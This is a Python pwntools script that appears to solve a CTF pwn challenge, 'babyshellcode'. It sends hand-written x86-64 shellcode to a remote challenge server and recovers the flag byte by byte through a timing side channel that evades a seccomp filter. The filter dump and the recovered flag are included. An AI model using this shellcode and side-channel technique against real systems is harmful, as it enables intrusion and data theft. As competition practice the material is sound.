#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
import string
import sys
context.log_level = "critical"
context.binary = "./babyshellcode"

idx = int(sys.argv[1])
dic = '_}' + string.ascii_lowercase + string.digits
# dic = list(set(string.printable).difference(set(dic)))
# print(dic)

for i in dic:
    try:
        i = sys.argv[2]
    except:
        pass
    print(i)
    # io = process("./babyshellcode")
    io = remote("209.97.162.170", 2222)
    sc = asm('''
            /* cancel alarm*/
            mov al, 0x25
            syscall
    
            /* get xor value and xor-ed flag*/
            mov bl, byte ptr [{IDX_K}]
            mov dl, byte ptr [{IDX_F}]
            xor bl, dl
    
            /* find flag[i] */
            mov al, {BYTE}
    
            loop:
            cmp al, bl
            je loop
    
            ret
            '''.format(BYTE = ord(i), IDX_K = 0xcafe028 + idx % 8, IDX_F = 0xcafe000 + idx))
    
    #  gdbcmd = 'bpie 0xD3C\nc\n' + 'si\n' * 19
    #  gdb.attach(io, gdbcmd)
    
    io.send(sc.ljust(0x46, '\x90'))
    
    try:
        io.interactive()
    except:
        io.close()
    if len(sys.argv) > 2:
        exit(0)
'''
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x05 0xc000003e  if (A != ARCH_X86_64) goto 0007
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x02 0xffffffff  if (A != 0xffffffff) goto 0007
 0005: 0x15 0x00 0x01 0x00000025  if (A != alarm) goto 0007
 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0007: 0x06 0x00 0x00 0x00000000  return KILL
'''
# ISITDTU{y0ur_sh3llc0d3_Sk!LL_s0_g00000d}
